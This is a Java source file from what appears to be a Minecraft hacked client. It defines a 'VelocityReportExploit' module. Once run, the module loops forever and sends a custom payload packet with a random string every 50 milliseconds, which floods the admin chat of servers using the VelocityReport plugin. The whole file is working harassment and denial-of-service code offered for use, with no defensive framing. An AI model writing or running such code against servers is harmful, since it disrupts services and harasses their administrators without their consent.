package io.github.spigotrce.paradiseclientfabric.exploit.impl;

import io.github.spigotrce.paradiseclientfabric.Helper;
import io.github.spigotrce.paradiseclientfabric.exploit.Exploit;
import io.github.spigotrce.paradiseclientfabric.packet.VelocityReportPayloadPacket;
import net.minecraft.client.MinecraftClient;
import net.minecraft.network.packet.c2s.common.CustomPayloadC2SPacket;

import java.util.Random;

@SuppressWarnings("BusyWait")
public class VelocityReportExploit extends Exploit {
    private final String CHARACTERS = "ABCDEFGHIJKLMNOPQRSTUVWXYZ!@#$%&'()*+,-./'";
    private final Random random = new Random();

    public VelocityReportExploit(MinecraftClient minecraftClient) {
        super("velocityreport-spammer", "Spams the admin chat of an admin using the VelocityReport plugin.", minecraftClient);
    }

    @Override
    public void execute() {
        Helper.printChatMessage("Spamming VelocityReport plugin...");
        new Thread(() -> {
            while (true) {
                Helper.sendPacket(new CustomPayloadC2SPacket(
                        new VelocityReportPayloadPacket(Helper.generateRandomString(12, CHARACTERS, random))
                ));
                try {
                    Thread.sleep(50);
                } catch (Exception ignored) {
                    Helper.printChatMessage("[CrashExploit] [VelocityReport] Unable to sleep 50ms");
                }
            }
        }).start();
    }
}
